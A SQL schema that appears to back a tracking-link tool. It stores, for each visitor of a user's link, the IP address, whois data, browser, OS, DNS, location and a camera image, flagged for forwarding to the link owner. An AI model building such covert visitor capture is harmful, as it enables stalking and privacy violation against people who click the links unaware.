CREATE TABLE IF NOT EXISTS links (
    link_name VARCHAR(255) PRIMARY KEY,
    user_id BIGINT NOT NULL
);

CREATE TABLE IF NOT EXISTS reffers (
    user_id BIGINT NOT NULL,
    link_name VARCHAR(255) NOT NULL,
    reffer_id CHAR(32) NOT NULL,
    ip_address VARCHAR(45),
    whois_link VARCHAR(255),
    browser_info TEXT,
    referer TEXT,
    language VARCHAR(50),
    visit_time DATETIME,
    screen_resolution VARCHAR(50),
    os_info VARCHAR(100),
    internet_speed VARCHAR(50),
    dns_info VARCHAR(255),
    location_info TEXT,
    camera_image TEXT,
    sent_to_user TINYINT(1) DEFAULT 0,
    PRIMARY KEY (reffer_id),
    FOREIGN KEY (link_name) REFERENCES links(link_name) ON DELETE CASCADE
);